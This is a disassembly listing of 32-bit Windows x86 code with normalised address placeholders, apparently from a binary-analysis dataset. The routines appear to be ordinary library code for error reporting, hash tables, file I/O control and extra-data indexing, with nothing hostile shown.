shr eax 0x1
xor edx edx
push r--data
push edi
mov [ edi + eax * 2 ] dx
call sub_43b1f5
add esp 0x8
neg eax
sbb eax eax
neg eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
sub_432800
mov eax 0x108
call sub_43a7f0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x104 ] eax
push 0xfffffff4
call [ GetStdHandle@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10c ]
lea edx [ esp + 0x110 ]
push edx
push eax
lea ecx [ esp + 0xc ]
push 0xff
push ecx
call sub_43b338
add esp 0x10
mov [ esp + 0x103 ] 0x0
call [ GetVersion@IAT ]
cmp eax 0x80000000
jae r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x10
push r--data
lea ecx [ esp + 0xc ]
push ecx
push 0x0
call [ MessageBoxA@IAT ]
mov ecx [ esp + 0x104 ]
xor ecx esp
call sub_437c1c
add esp 0x108
retn
call sub_4326c0
test eax eax
jle r-xdata
mov ecx [ esp + 0x10c ]
lea eax [ esp + 0x110 ]
push eax
push ecx
call sub_438fc8
add eax 0x40
push eax
call sub_43b460
add esp 0xc
mov ecx [ esp + 0x104 ]
xor ecx esp
call sub_437c1c
add esp 0x108
retn
push esi
push r--data
push 0x0
call [ RegisterEventSourceA@IAT ]
push 0x0
mov esi eax
lea eax [ esp + 0x8 ]
push eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
push 0x1
lea edx [ esp + 0x28 ]
push esi
mov [ esp + 0x28 ] edx
call [ ReportEventA@IAT ]
push esi
call [ DeregisterEventSource@IAT ]
pop esi
mov ecx [ esp + 0x104 ]
xor ecx esp
call sub_437c1c
add esp 0x108
retn
sub_432920
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
push r--data
call sub_432800
push 0x16
call sub_43b7cc
add esp 0x14
push 0x3
call sub_43b718
int3
sub_432950
push esi
mov esi [ esp + 0xc ]
test esi esi
jns r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop esi
retn
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0xc ]
push edx
push esi
push ecx
call eax
add esp 0x10
push esi
call sub_432520
add esp 0x4
test eax eax
je r-xdata
push r--data
push 0x24f
push r--data
call sub_432920
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push ecx
push edx
push eax
mov eax [ esp + 0x14 ]
push eax
call [ rw-data ]
push esi
call sub_432450
add esp 0x14
pop esi
retn
sub_4329d0
mov eax [ rw-data ]
test eax eax
je r-xdata
push ebx
mov ebx [ esp + 0x14 ]
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov edi [ esp + 0x24 ]
push edi
push ebx
push ebp
push 0x9
call sub_432950
mov eax [ esp + 0x24 ]
mov esi [ eax ]
add esi [ esp + 0x28 ]
push edi
push ebx
push ebp
push 0xa
mov [ eax ] esi
call sub_432950
add esp 0x20
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn
jmp eax
sub_432a20
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
retn
push edi
xor edi edi
cmp [ ebx + 0xc ] edi
jbe r-xdata
mov ecx [ ebx ]
push ecx
call sub_431c30
push ebx
call sub_431c30
add esp 0x8
pop edi
push esi
inc edi
cmp edi [ ebx + 0xc ]
jb r-xdata
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
pop esi
mov esi [ eax + 0x4 ]
push eax
call sub_431c30
add esp 0x4
mov eax esi
test esi esi
jne r-xdata
sub_432a70
push ebp
mov ebp [ esp + 0x8 ]
test ebp ebp
je r-xdata
pop ebp
retn
push edi
mov edi [ ebp + 0xc ]
dec edi
js r-xdata
pop edi
push ebx
mov ebx [ esp + 0x14 ]
push esi
dec edi
jns r-xdata
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
push ecx
call ebx
add esp 0x4
mov eax esi
test esi esi
jne r-xdata
mov eax [ ebp ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
pop esi
pop ebx
sub_432ab0
mov eax 0x4
call sub_43a7f0
mov ecx [ esi + 0x18 ]
push ebx
mov ebx [ esi + 0x14 ]
mov eax 0x1
add [ esi + 0xc ] eax
add [ esi + 0x28 ] eax
lea eax [ ebx + 0x1 ]
mov [ esi + 0x14 ] eax
mov eax [ esi ]
add ecx ebx
push ebp
lea ebp [ eax + ecx * 4 ]
push edi
lea edi [ eax + ebx * 4 ]
mov [ ebp ] 0x0
mov ecx [ edi ]
mov edx [ esi + 0x10 ]
mov [ esp + 0xc ] edx
test ecx ecx
je r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx [ esi + 0x18 ]
jb r-xdata
mov eax [ ecx + 0x8 ]
xor edx edx
div [ esp + 0xc ]
cmp edx ebx
je r-xdata
pop edi
pop ebp
pop ebx
pop ecx
retn
mov ebx [ esi + 0x10 ]
mov eax [ esi ]
push 0x15b
add ebx ebx
push r--data
lea edx [ ebx * 4 ]
push edx
push eax
call sub_431bb0
mov edx eax
xor ebp ebp
add esp 0x10
cmp edx ebp
jne r-xdata
mov edi [ edi ]
add edi 0x4
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov [ edi ] edx
mov eax [ ebp ]
mov [ ecx + 0x4 ] eax
mov [ ebp ] ecx
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
jae r-xdata
inc [ esi + 0x5c ]
pop edi
mov [ esi + 0x14 ] ebp
pop ebp
pop ebx
pop ecx
retn
mov ecx [ edi ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x10 ]
inc [ esi + 0x2c ]
mov [ esi + 0x18 ] ecx
mov [ esi + 0x10 ] ebx
mov [ esi ] edx
mov [ esi + 0x14 ] ebp
mov ecx ebx
lea edi [ edx + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
sub_432b90
mov eax [ esi + 0x14 ]
add eax [ esi + 0x18 ]
mov ecx [ esi ]
lea eax [ ecx + eax * 4 - 0x4 ]
push ebx
mov ebx [ eax ]
mov [ eax ] 0x0
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
dec eax
mov [ esi + 0x14 ] eax
mov edx [ esi + 0x18 ]
mov eax [ esi ]
push 0x177
add edx edx
push r--data
add edx edx
push edx
push eax
call sub_431bb0
add esp 0x10
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov [ ecx ] ebx
pop ebx
retn
shr [ esi + 0x18 ] 0x1
mov ecx [ esi + 0x18 ]
inc [ esi + 0x34 ]
shr [ esi + 0x10 ] 0x1
dec ecx
mov [ esi + 0x14 ] ecx
mov [ esi ] eax
jmp r-xdata
inc [ esi + 0x5c ]
pop ebx
retn
mov [ eax + 0x4 ] ebx
pop ebx
retn
lea esp [ esp ]
mov ecx [ esi + 0x14 ]
mov edx [ esi ]
dec [ esi + 0xc ]
inc [ esi + 0x30 ]
mov eax [ edx + ecx * 4 ]
lea ecx [ edx + ecx * 4 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub_432c20
mov eax [ esp + 0x4 ]
mov ecx [ esi + 0x8 ]
push ebx
push ebp
push edi
push eax
call ecx
mov edx [ esp + 0x18 ]
mov ebp eax
mov ecx 0x1
add [ esi + 0x38 ] ecx
mov [ edx ] ebp
xor edx edx
div [ esi + 0x18 ]
add esp 0x4
cmp edx [ esi + 0x14 ]
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esp + 0x14 ] eax
mov eax [ esi ]
mov edi [ eax + edx * 4 ]
lea ebx [ eax + edx * 4 ]
test edi edi
je r-xdata
mov eax ebp
xor edx edx
div [ esi + 0x10 ]
pop edi
pop ebp
mov eax ebx
pop ebx
retn
add [ esi + 0x58 ] ecx
cmp [ edi + 0x8 ] ebp
jne r-xdata
lea eax [ edi + 0x4 ]
mov edi [ eax ]
mov ebx eax
test edi edi
jne r-xdata
add [ esi + 0x3c ] ecx
mov ecx [ esp + 0x10 ]
mov edx [ edi ]
push ecx
push edx
call [ esp + 0x1c ]
add esp 0x8
test eax eax
je r-xdata
mov ecx 0x1
sub_432ca0
mov edx [ esp + 0x4 ]
push esi
xor esi esi
test edx edx
je r-xdata
xor eax eax
pop esi
retn
mov al [ edx ]
test al al
je r-xdata
push edi
mov edi 0x100
movsx eax al
or eax edi
mov ecx eax
shr ecx 0x2
xor ecx eax
imul eax eax
and ecx 0xf
add edi 0x100
rol esi cl
inc edx
xor esi eax
mov al [ edx ]
test al al
jne r-xdata
mov eax esi
shr eax 0x10
pop edi
xor eax esi
pop esi
retn
sub_432d00
push esi
push edi
push 0x77
push r--data
push 0x60
call sub_431b40
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
je r-xdata
pop edi
xor eax eax
pop esi
retn
push 0x79
push r--data
push 0x40
call sub_431b40
add esp 0xc
mov [ esi ] eax
cmp eax edi
jne r-xdata
xor eax eax
push esi
call sub_431c30
add esp 0x4
mov ecx [ esi ]
mov [ eax + ecx ] edi
add eax 0x4
cmp eax 0x40
jl r-xdata
mov eax [ esp + 0x10 ]
cmp eax edi
jne r-xdata
mov [ esi + 0x4 ] eax
mov eax [ esp + 0xc ]
cmp eax edi
jne r-xdata
mov eax sub_43b970
mov [ esi + 0x8 ] eax
mov eax 0x8
mov [ esi + 0x14 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] edi
mov [ esi + 0xc ] eax
mov [ esi + 0x18 ] eax
pop edi
mov [ esi + 0x10 ] 0x10
mov [ esi + 0x1c ] 0x200
mov [ esi + 0x20 ] 0x100
mov eax esi
pop esi
retn
mov eax sub_432ca0
sub_432dd0
push ebx
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0x24 ]
shl eax 0x8
xor edx edx
div [ esi + 0xc ]
push edi
mov [ esi + 0x5c ] 0x0
cmp [ esi + 0x1c ] eax
ja r-xdata
mov ebx [ esp + 0x14 ]
lea eax [ esp + 0x10 ]
push eax
push ebx
call sub_432c20
mov edi eax
mov ecx [ edi ]
add esp 0x8
test ecx ecx
jne r-xdata
call sub_432ab0
mov eax [ ecx ]
mov [ ecx ] ebx
inc [ esi + 0x44 ]
pop edi
pop esi
pop ebx
retn
push 0xc1
push r--data
push 0xc
call sub_431b40
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov [ eax ] ebx
mov [ eax + 0x4 ] 0x0
mov [ edi ] eax
mov ecx 0x1
add [ esi + 0x40 ] ecx
pop edi
xor eax eax
add [ esi + 0x24 ] ecx
pop esi
pop ebx
retn
inc [ esi + 0x5c ]
pop edi
pop esi
pop ebx
retn
sub_432e60
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
lea eax [ esp + 0x8 ]
push eax
push ecx
mov [ esi + 0x5c ] 0x0
call sub_432c20
mov ecx [ eax ]
add esp 0x8
test ecx ecx
jne r-xdata
mov edx [ ecx + 0x4 ]
push edi
mov [ eax ] edx
mov edi [ ecx ]
push ecx
call sub_431c30
dec [ esi + 0x24 ]
mov ecx [ esi + 0xc ]
inc [ esi + 0x48 ]
mov eax [ esi + 0x24 ]
add esp 0x4
cmp ecx 0x10
jbe r-xdata
inc [ esi + 0x4c ]
xor eax eax
pop esi
retn
mov eax edi
pop edi
pop esi
retn
shl eax 0x8
xor edx edx
div ecx
cmp [ esi + 0x20 ] eax
jb r-xdata
call sub_432b90
sub_432ed0
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
lea eax [ esp + 0x8 ]
push eax
push ecx
mov [ esi + 0x5c ] 0x0
call sub_432c20
mov eax [ eax ]
add esp 0x8
test eax eax
jne r-xdata
mov eax [ eax ]
inc [ esi + 0x50 ]
pop esi
retn
inc [ esi + 0x54 ]
pop esi
retn
sub_432f00
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
cmp ecx 0x1
jbe r-xdata
test ecx ecx
je r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
lea edx [ eax + 0x1 ]
mov [ esi ] 0x0
mov [ esi ] dl
dec ecx
inc esi
inc eax
inc edi
cmp ecx 0x1
ja r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add eax edi
pop edi
pop esi
retn
sub_432f40
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
push edi
test eax eax
je r-xdata
xor edi edi
push esi
mov esi [ esp + 0x14 ]
cmp eax 0x1
jbe r-xdata
cmp [ ecx ] 0x0
je r-xdata
test eax eax
je r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
inc ebx
inc ecx
dec eax
jne r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
pop esi
mov [ ecx ] 0x0
mov [ ecx ] dl
dec eax
inc ecx
inc esi
inc edi
cmp eax 0x1
ja r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add eax edi
pop edi
add eax ebx
pop ebx
retn
sub_432fc0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax 0x1
pop esi
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
mov [ esi + 0xc ] 0x0
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push eax
call sub_438a5b
add esp 0x4
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x14 ] 0x0
sub_433010
push esi
mov esi [ esp + 0x8 ]
xor eax eax
cmp [ esi + 0xc ] eax
je r-xdata
pop esi
retn
mov ecx [ esp + 0xc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ esp + 0x10 ]
push edi
push eax
push edx
push 0x1
push ecx
call sub_4386d2
mov edi eax
mov eax [ esi + 0x20 ]
push eax
call sub_43ba20
add esp 0x14
test eax eax
je r-xdata
mov eax edi
pop edi
push 0xf5
push r--data
call [ GetLastError@IAT ]
push eax
push 0xb
push 0x2
call sub_4345f0
push 0xf6
push r--data
push 0x2
push 0x82
push 0x20
call sub_4345f0
add esp 0x28
pop edi
or eax 0xffffffff
pop esi
retn
sub_433090
mov edx [ esp + 0x4 ]
xor eax eax
cmp [ edx + 0xc ] eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
test ecx ecx
je r-xdata
mov eax [ edx + 0x20 ]
push esi
mov esi [ esp + 0x10 ]
push eax
push 0x1
push esi
push ecx
call sub_43bb9f
add esp 0x10
test eax eax
je r-xdata
pop esi
mov eax esi
sub_4330c0
mov ecx [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi + 0x20 ]
dec ecx
push edi
mov ebp 0x1
cmp ecx 0x84
ja r-xdata
xor ebp ebp
movzx ecx [ ecx + lookup_table_433330 ]
jmp [ ecx * 4 + jump_table_433304 ]
mov edx [ esp + 0x1c ]
push 0x0
push edx
push eax
call sub_438972
add esp 0xc
pop edi
pop esi
mov ebp eax
pop ebp
pop ebx
retn
push eax
call sub_43b9f8
add esp 0x4
pop edi
pop esi
mov ebp eax
pop ebp
pop ebx
retn
push eax
call sub_438883
add esp 0x4
pop edi
pop esi
mov ebp eax
pop ebp
pop ebx
retn
push esi
call sub_432fc0
mov ebx [ esp + 0x20 ]
mov eax ebx
and eax ebp
mov [ esi + 0x10 ] eax
mov eax [ esp + 0x24 ]
push eax
mov [ esi + 0x20 ] eax
mov [ esi + 0xc ] ebp
call sub_43917d
add esp 0x8
test bl 0x10
je r-xdata
push esi
call sub_432fc0
mov ebx [ esp + 0x20 ]
mov ecx ebx
and ecx ebp
add esp 0x4
mov [ esi + 0x10 ] ecx
test bl 0x8
je r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
mov ecx [ esp + 0x20 ]
test ecx ecx
je r-xdata
mov ebp [ esi + 0x10 ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
mov edx [ esp + 0x1c ]
pop edi
mov [ esi + 0x10 ] edx
pop esi
mov eax ebp
pop ebp
pop ebx
retn
push eax
call sub_43bda3
add esp 0x4
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
push 0x8000
push eax
call sub_43928b
add esp 0x8
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
push 0x4000
push eax
call sub_43928b
add esp 0x8
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
mov eax ebx
and eax 0x2
je r-xdata
push 0x4
test bl 0x2
je r-xdata
pop edi
pop esi
mov [ ecx ] eax
mov eax ebp
pop ebp
pop ebx
retn
test bl 0x4
je r-xdata
test bl 0x4
je r-xdata
push r--data
jmp r-xdata
push r--data
lea edx [ esp + 0x1c ]
push edx
jmp r-xdata
test eax eax
je r-xdata
push 0x4
push r--data
lea edx [ esp + 0x1c ]
push edx
jmp r-xdata
push 0x4
push r--data
lea ecx [ esp + 0x1c ]
push ecx
jmp r-xdata
lea eax [ esp + 0x1c ]
push eax
call sub_432f00
lea edi [ esp + 0x20 ]
add esp 0xc
dec edi
test bl 0x10
jne r-xdata
push 0x17b
push r--data
push 0x65
push 0x74
push 0x20
call sub_4345f0
add esp 0x14
pop edi
xor ebp ebp
pop esi
mov eax ebp
pop ebp
pop ebx
retn
push 0x4
push r--data
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
nop
mov dx [ r--data ]
mov [ edi ] dx
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov cx [ r--data ]
mov [ edi ] cx
jmp r-xdata
push 0x0
push esi
mov [ esi + 0x20 ] eax
mov [ esi + 0xc ] ebp
call sub_4320d0
add esp 0x8
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
push 0x18e
push r--data
call [ GetLastError@IAT ]
push eax
push ebp
push 0x2
call sub_4345f0
push r--data
lea ecx [ esp + 0x2c ]
push ecx
push r--data
push edi
push r--data
push 0x5
call sub_4343c0
push 0x190
push r--data
push 0x2
push 0x74
push 0x20
call sub_4345f0
add esp 0x40
mov edi [ esp + 0x20 ]
lea eax [ esp + 0x14 ]
push eax
push edi
call sub_43bebb
add esp 0x8
test eax eax
jne r-xdata
sub_43333b
push es
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or al [ edi ]
or [ ecx ] cl
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or al [ eax ]
or cl [ edx ]
or cl [ edx ]
add cl ah
int3
sub_4333c0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov [ esi ] 0x0
mov ecx [ eax + 0x20 ]
push ecx
push edx
push esi
xor edi edi
call sub_43bed2
add esp 0xc
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
retn
cmp [ esi ] 0x0
je r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
pop edi
sub eax edx
pop esi
retn
sub_433410
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0xc ]
sub eax edx
mov esi eax
xor eax eax
cmp [ ecx + 0xc ] eax
je r-xdata
pop edi
pop esi
retn
test edi edi
je r-xdata
mov eax [ ecx + 0x20 ]
push eax
push 0x1
push esi
push edi
call sub_43bb9f
add esp 0x10
test eax eax
je r-xdata
mov eax esi
sub_433470
push esi
push 0x10e
push r--data
push 0x2
push 0x9
mov esi 0x1
call sub_432950
add esp 0x10
cmp [ rw-data ] 0x0
jne r-xdata
push 0x112
push r--data
push 0x2
push 0xa
call sub_432950
add esp 0x10
mov eax esi
pop esi
retn
push sub_433c90
push sub_433460
call sub_432d00
add esp 0x8
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor esi esi
sub_433500
mov eax 0xc
call sub_43a7f0
cmp [ rw-data ] 0x0
jne r-xdata
push edi
push 0x130
push r--data
push 0x2
push 0x9
mov [ esp + 0x14 ] ebx
call sub_432950
mov ecx [ rw-data ]
lea eax [ esp + 0x14 ]
push eax
push ecx
call sub_432ed0
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
call sub_433470
test eax eax
jne r-xdata
push 0x145
push r--data
push 0x2
push 0xa
call sub_432950
add esp 0x10
test edi edi
jne r-xdata
push esi
push 0x134
push r--data
push 0xc
call sub_431b40
mov esi eax
add esp 0xc
test esi esi
je r-xdata
add esp 0xc
retn
mov eax edi
pop edi
add esp 0xc
retn
push 0x147
push r--data
push 0x41
push 0x69
push 0xf
call sub_4345f0
add esp 0x14
pop esi
mov [ esi ] ebx
mov [ esi + 0x8 ] edi
call sub_4348b0
mov [ esi + 0x4 ] eax
push esi
test eax eax
jne r-xdata
mov edx [ rw-data ]
push edx
call sub_432dd0
add esp 0x8
mov edi esi
call sub_431c30
add esp 0x4
jmp r-xdata
sub_4335e0
push ebx
push esi
push 0x153
push r--data
push 0x14
or ebx 0xffffffff
call sub_431b40
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push 0x15e
push r--data
mov [ esi ] eax
mov eax [ esp + 0x20 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esp + 0x24 ]
push 0x2
push 0x9
mov [ esi + 0x8 ] edx
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] ecx
call sub_432950
mov edx [ edi + 0x4 ]
push edx
call sub_434850
add esp 0x14
cmp eax [ edi + 0x8 ]
jg r-xdata
push 0x156
push r--data
push 0x41
push 0x68
push 0xf
call sub_4345f0
add esp 0x14
pop esi
or eax ebx
pop ebx
retn
mov ebx [ edi + 0x8 ]
mov eax [ edi + 0x4 ]
push esi
lea edx [ ebx + 0x1 ]
push ebx
push eax
mov [ edi + 0x8 ] edx
call sub_434880
add esp 0xc
mov eax [ edi + 0x4 ]
push 0x0
push eax
call sub_434800
add esp 0x8
test eax eax
je r-xdata
push 0x163
push r--data
push 0x41
push 0x68
push 0xf
call sub_4345f0
push esi
call sub_431c30
add esp 0x18
jmp r-xdata
mov ecx [ edi + 0x4 ]
push ecx
call sub_434850
add esp 0x4
cmp eax [ edi + 0x8 ]
jle r-xdata
push 0x16b
push r--data
push 0x2
push 0xa
call sub_432950
add esp 0x10
pop esi
mov eax ebx
pop ebx
retn
sub_4336e0
push esi
push 0x175
push r--data
push 0x2
push 0x9
call sub_432950
mov eax [ rw-data ]
push 0x177
push r--data
mov esi eax
inc eax
push 0x2
push 0xa
mov [ rw-data ] eax
call sub_432950
add esp 0x20
mov eax esi
pop esi
retn
sub_433720
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push sub_4334e0
push eax
call sub_432a70
mov ecx [ rw-data ]
push ecx
call sub_432a20
add esp 0xc
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_433470
test eax eax
je r-xdata
retn
sub_433770
push ebx
mov ebx [ esp + 0x8 ]
call sub_433500
pop ebx
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push edi
push ecx
mov ecx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x18 ]
push edx
push ecx
mov edi eax
call sub_4335e0
add esp 0x14
pop edi
retn
or eax 0xffffffff
retn
sub_4337b0
push edi
mov edi [ esp + 0x8 ]
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
push ebx
push esi
push eax
call sub_434850
mov ebx [ esp + 0x18 ]
mov esi eax
add esp 0x4
cmp esi ebx
jg r-xdata
call sub_4348b0
mov [ edi ] eax
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ edi ]
push edx
push ebx
push eax
call sub_434880
add esp 0xc
pop esi
pop ebx
mov eax 0x1
pop edi
retn
mov ecx [ edi ]
push 0x0
push ecx
call sub_434800
add esp 0x8
test eax eax
je r-xdata
push 0x25d
push r--data
push 0x41
push 0x66
push 0xf
call sub_4345f0
add esp 0x14
xor eax eax
pop edi
retn
push 0x267
push r--data
push 0x41
push 0x66
push 0xf
call sub_4345f0
add esp 0x14
pop esi
pop ebx
xor eax eax
pop edi
retn
inc esi
cmp esi ebx
jle r-xdata
sub_433850
push ebx
mov ebx [ esp + 0x8 ]
push edi
xor edi edi
call sub_433500
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ esp + 0x14 ]
push ebp
push esi
push 0x19d
push r--data
push 0x2
push 0x5
mov [ eax ] edi
call sub_432950
mov ecx [ ebx + 0x4 ]
push ecx
call sub_434850
mov ebp eax
add esp 0x14
test ebp ebp
jle r-xdata
pop edi
pop ebx
retn
push 0x1a8
push r--data
push 0x2
push 0x6
call sub_432950
add esp 0x10
test ebp ebp
jle r-xdata
push 0x1a1
lea edx [ ebp * 4 ]
push r--data
push edx
call sub_431b40
mov edi eax
add esp 0xc
test edi edi
je r-xdata
xor esi esi
test ebp ebp
jle r-xdata
test edi edi
jne r-xdata
xor esi esi
test ebp ebp
jle r-xdata
test edi edi
je r-xdata
mov eax [ edi + esi * 4 ]
test eax eax
je r-xdata
push 0x1ab
push r--data
push 0x41
push 0x6c
push 0xf
call sub_4345f0
add esp 0x14
pop esi
pop ebp
pop edi
xor eax eax
pop ebx
retn
lea esp [ esp ]
pop esi
pop ebp
pop edi
mov eax 0x1
pop ebx
retn
push edi
call sub_431c30
add esp 0x4
inc esi
cmp esi ebp
jl r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
push esi
push eax
call sub_434860
mov [ edi + esi * 4 ] eax
inc esi
add esp 0x8
cmp esi ebp
jl r-xdata
mov ebx [ esp + 0x1c ]
mov eax [ ebx ]
test eax eax
je r-xdata
mov ecx [ edi + esi * 4 ]
mov edx [ ecx + 0x4 ]
push edx
mov edx [ ecx ]
mov ecx [ ecx + 0x8 ]
push edx
push esi
push ebx
push eax
mov eax [ esp + 0x2c ]
push eax
call ecx
add esp 0x18
push eax
call sub_434850
add esp 0x4
cmp esi eax
jl r-xdata
mov ecx [ ebx ]
push esi
push ecx
call sub_434860
add esp 0x8
xor eax eax
jmp r-xdata
sub_433990
mov eax 0x4
call sub_43a7f0
push ebp
push esi
mov esi [ esp + 0x18 ]
xor ebp ebp
cmp [ esi ] ebp
jne r-xdata
push ebx
mov ebx [ esp + 0x14 ]
call sub_433500
mov ebx eax
test ebx ebx
jne r-xdata
pop esi
lea eax [ ebp + 0x1 ]
pop ebp
pop ecx
retn
push edi
push 0x1c9
push r--data
push 0x2
push 0x5
call sub_432950
mov eax [ ebx + 0x4 ]
push eax
call sub_434850
mov ecx [ esi ]
push ecx
mov edi eax
call sub_434850
add esp 0x18
cmp eax edi
jge r-xdata
pop ebx
pop esi
pop ebp
pop ecx
retn
test edi edi
jle r-xdata
mov edi eax
push 0x1d7
push r--data
push 0x2
push 0x6
call sub_432950
add esp 0x10
test edi edi
jle r-xdata
push 0x1d0
lea edx [ edi * 4 ]
push r--data
push edx
call sub_431b40
mov ebp eax
add esp 0xc
test ebp ebp
je r-xdata
xor esi esi
test edi edi
jle r-xdata
test ebp ebp
jne r-xdata
xor esi esi
test edi edi
jle r-xdata
test ebp ebp
je r-xdata
lea ebx [ ebx ]
push 0x1da
push r--data
push 0x41
push 0x6a
push 0xf
call sub_4345f0
add esp 0x14
pop edi
pop ebx
pop esi
xor eax eax
pop ebp
pop ecx
retn
lea esp [ esp ]
pop edi
pop ebx
pop esi
mov eax 0x1
pop ebp
pop ecx
retn
push ebp
call sub_431c30
add esp 0x4
mov [ esp + 0x10 ] eax
mov eax [ ebp + esi * 4 ]
test eax eax
je r-xdata
push eax
call sub_434850
add esp 0x4
cmp esi eax
jl r-xdata
mov eax [ ebx + 0x4 ]
push esi
push eax
call sub_434860
